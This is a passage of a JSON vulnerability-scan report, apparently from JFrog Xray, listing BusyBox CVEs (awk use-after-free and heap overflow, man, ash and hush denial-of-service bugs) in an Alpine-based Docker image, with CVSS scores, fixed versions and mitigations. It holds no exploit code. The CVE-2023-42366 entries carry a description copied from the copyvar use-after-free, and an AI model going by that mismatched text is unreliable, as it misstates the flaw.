         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-539895",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the vulnerable `copyvar` function.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Busybox Bugzilla",
                  "Url": "https://bugs.busybox.net/show_bug.cgi?id=15871",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-42365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-539895",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A use-after-free vulnerability was discovered in BusyBox v.1.36.1 via a crafted awk pattern in the awk.c copyvar function.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.36.1-r30"
            ],
            "fixed_versions": [
               "1.36.1-r30"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42365",
                     "cwe": [
                        "CWE-416"
                     ],
                     "cwe_details": {
                        "CWE-416": {
                           "name": "Use After Free",
                           "description": "Referencing memory after it has been freed can cause a program to crash, use unexpected values, or execute code.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "4"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A use-after-free vulnerability was discovered in BusyBox v.1.36.1 via a crafted awk pattern in the awk.c copyvar function.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-539895",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the vulnerable `copyvar` function.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Busybox Bugzilla",
                  "Url": "https://bugs.busybox.net/show_bug.cgi?id=15871",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-42365",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-539894",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A heap-buffer-overflow was discovered in BusyBox v.1.36.1 in the next_token function at awk.c:1159.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.36.1-r25"
            ],
            "fixed_versions": [
               "1.36.1-r25"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42366",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A heap-buffer-overflow was discovered in BusyBox v.1.36.1 in the next_token function at awk.c:1159.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-539894",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox’s `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the vulnerable `next_token` function.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Busybox's Bugzilla",
                  "Url": "https://bugs.busybox.net/show_bug.cgi?id=15871",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-42366",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-539894",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A heap-buffer-overflow was discovered in BusyBox v.1.36.1 in the next_token function at awk.c:1159.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.36.1-r25"
            ],
            "fixed_versions": [
               "1.36.1-r25"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-42366",
                     "cwe": [
                        "CWE-787"
                     ],
                     "cwe_details": {
                        "CWE-787": {
                           "name": "Out-of-bounds Write",
                           "description": "The product writes data past the end, or before the beginning, of the intended buffer.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "1"
                              }
                           ]
                        }
                     },
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A heap-buffer-overflow was discovered in BusyBox v.1.36.1 in the next_token function at awk.c:1159.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-539894",
            "VulnerabilityTitle": "",
            "ShortDescription": "A use-after-free in Busybox awk leads to remote code execution when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA use-after-free in awk leads to denial of service and possibly code execution when processing a crafted awk pattern in the `copyvar` function.\nAn attacker that controls the `awk` pattern (through the command line argument) can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_AWK=y` in Busybox’s `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Full control of the `awk` pattern usually leads to RCE, without needing to exploit this UAF. The issue is mostly relevant if the attacker can control the pattern, but it is filtered before being passed to `awk`.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the vulnerable `next_token` function.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Busybox's Bugzilla",
                  "Url": "https://bugs.busybox.net/show_bug.cgi?id=15871",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-42366",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190235",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A NULL pointer dereference in Busybox's man applet leads to denial of service when a section name is supplied but no page argument is given",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "1.33.0-r0 ≤ Version ≤ 1.33.1-r8"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42373",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer dereference in Busybox's man applet leads to denial of service when a section name is supplied but no page argument is given",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190235",
            "VulnerabilityTitle": "",
            "ShortDescription": "A NULL pointer dereference in Busybox man leads to denial of service when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA NULL pointer dereference was found in the `man` applet, which leads to denial of service when a section name is supplied but no page argument is given.\nAn attacker that controls `man` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_MAN=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Busybox applets are usually run as standalone (forked) processes and thus a DoS will have a minimal effect",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42373",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190235",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A NULL pointer dereference in Busybox's man applet leads to denial of service when a section name is supplied but no page argument is given",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "1.33.0-r0 ≤ Version ≤ 1.33.1-r8"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42373",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "2.1/CVSS:2.0/AV:L/AC:L/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer dereference in Busybox's man applet leads to denial of service when a section name is supplied but no page argument is given",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190235",
            "VulnerabilityTitle": "",
            "ShortDescription": "A NULL pointer dereference in Busybox man leads to denial of service when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA NULL pointer dereference was found in the `man` applet, which leads to denial of service when a section name is supplied but no page argument is given.\nAn attacker that controls `man` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_MAN=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "Busybox applets are usually run as standalone (forked) processes and thus a DoS will have a minimal effect",
                  "IsPositive": 1,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42373",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190233",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An incorrect handling of a special element in Busybox's ash applet leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:ssl_client",
         "source_id": "alpine://3.14:ssl_client",
         "source_comp_id": "alpine://3.14:ssl_client:1.33.1-r2",
         "component_versions": {
            "id": "3.14:ssl_client",
            "vulnerable_versions": [
               "< 1.33.1-r5"
            ],
            "fixed_versions": [
               "1.33.1-r5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42375",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An incorrect handling of a special element in Busybox's ash applet leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190233",
            "VulnerabilityTitle": "",
            "ShortDescription": "A incorrect handling of a special element in Busybox ash leads to denial of service when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn incorrect handling of a special element in `ash` leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.\nAn attacker that controls `ash` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_ASH=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "`ash` command line argument control usually leads to RCE, which is more severe than DoS. The issue is mostly relevant if the attacker can control the arguments, but they are filtered before being passed to `ash`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42375",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190233",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "An incorrect handling of a special element in Busybox's ash applet leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "< 1.33.1-r5"
            ],
            "fixed_versions": [
               "1.33.1-r5"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42375",
                     "cwe": [
                        "NVD-CWE-Other"
                     ],
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "An incorrect handling of a special element in Busybox's ash applet leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190233",
            "VulnerabilityTitle": "",
            "ShortDescription": "A incorrect handling of a special element in Busybox ash leads to denial of service when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nAn incorrect handling of a special element in `ash` leads to denial of service when processing a crafted shell command, due to the shell mistaking specific characters for reserved characters. This may be used for DoS under rare conditions of filtered command input.\nAn attacker that controls `ash` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_ASH=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The prerequisites for exploiting the issue are extremely unlikely",
                  "Description": "The applet must accept arbitrary command line arguments from an external source",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue cannot result in a severe impact (such as remote code execution)",
                  "Description": "`ash` command line argument control usually leads to RCE, which is more severe than DoS. The issue is mostly relevant if the attacker can control the arguments, but they are filtered before being passed to `ash`.",
                  "IsPositive": 1,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The attacker would need to determine which external input propagates into the applet's command line arguments",
                  "IsPositive": 1,
                  "InsertOrder": 2
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "JFrog blogpost",
                  "Url": "https://jfrog.com/blog/unboxing-busybox-14-new-vulnerabilities-uncovered-by-claroty-and-jfrog/",
                  "InsertOrder": 1
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:6",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2021-42375",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-190221",
         "severity": "Medium",
         "jfrog_severity": "Medium",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "alpine",
         "summary": "A NULL pointer dereference in Busybox's hush applet leads to denial of service when processing a crafted shell command, due to missing validation after a \\x03 delimiter character. This may be used for DoS under very rare conditions of filtered command input.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "3.14:busybox",
         "source_id": "alpine://3.14:busybox",
         "source_comp_id": "alpine://3.14:busybox:1.33.1-r2",
         "component_versions": {
            "id": "3.14:busybox",
            "vulnerable_versions": [
               "1.16.0-r0 ≤ Version ≤ 1.33.1-r8"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2021-42376",
                     "cwe": [
                        "CWE-476"
                     ],
                     "cwe_details": {
                        "CWE-476": {
                           "name": "NULL Pointer Dereference",
                           "description": "A NULL pointer dereference occurs when the application dereferences a pointer that it expects to be valid, but is NULL, typically causing a crash or exit.",
                           "categories": [
                              {
                                 "category": "2023 CWE Top 25",
                                 "rank": "12"
                              }
                           ]
                        }
                     },
                     "cvss_v2": "1.9/CVSS:2.0/AV:L/AC:M/Au:N/C:N/I:N/A:P",
                     "cvss_v3": "5.5/CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "A NULL pointer dereference in Busybox's hush applet leads to denial of service when processing a crafted shell command, due to missing validation after a \\x03 delimiter character. This may be used for DoS under very rare conditions of filtered command input.",
               "provider": "JFrog"
            }
         },
         "edited": "2023-01-08T19:27:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-190221",
            "VulnerabilityTitle": "",
            "ShortDescription": "A NULL pointer dereference in Busybox hush leads to denial of service when processing malformed command line arguments.",
            "FullDescription": "The [BusyBox](https://busybox.net/) toolkit implements a large number of Linux tools in a single executable and can even replace the Linux init system. Its small size and flexibility make it popular in embedded devices.\n\nA NULL pointer dereference in `hush` leads to denial of service when processing a crafted shell command, due to missing validation after a `\\x03` delimiter character. This may be used for DoS under very rare conditions of filtered command input.\nAn attacker that controls `hush` command line arguments can trigger this issue.",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Development mitigations\n\nComment out `CONFIG_HUSH=y` in Busybox's `.config` file and recompile",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
